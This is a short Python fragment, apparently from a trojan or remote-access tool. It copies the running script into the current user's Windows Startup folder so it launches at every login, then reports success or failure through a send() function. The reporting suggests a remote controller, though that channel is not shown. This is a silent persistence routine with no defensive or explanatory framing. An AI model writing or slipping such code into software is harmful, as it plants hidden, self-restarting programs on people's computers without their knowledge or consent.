name = os.getlogin()
zidongkaiqi = 'C:/Users/'+name+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'
try:
    shutil.copy(sys.argv[0].split('\\')[::-1][0],zidongkaiqi)
    send('start run yes!!')
except:
    send('start run error')